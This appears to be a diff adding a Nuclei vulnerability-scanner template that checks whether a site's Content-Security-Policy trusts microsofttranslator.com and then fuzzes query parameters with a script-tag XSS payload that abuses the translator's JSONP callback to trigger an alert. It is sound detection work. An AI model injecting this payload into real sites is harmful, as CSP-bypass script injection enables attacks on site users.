@@ -1,0 +1,55 @@
+id: microsofttranslator-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Microsoft Translator API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,microsofttranslator-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "microsofttranslator.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: microsofttranslator_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.microsofttranslator.com/V2/Ajax.svc/GetLanguagesForTranslate?oncomplete=alert&appId=417CEAD93449502CC3C9B69FED26C54118E62BCC"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "microsofttranslator_api_csp_xss == true"
+# digest: 4a0a00473045022031788cd05f3da4a35a50c1c57161f0be81f1eb7b1812afc98af7c56aad2969b0022100aca3f096d8205a81008290d1b0f2d732733fab77e30629561979f35fea432e1d:922c64590222798bb761d5b6d8e72950
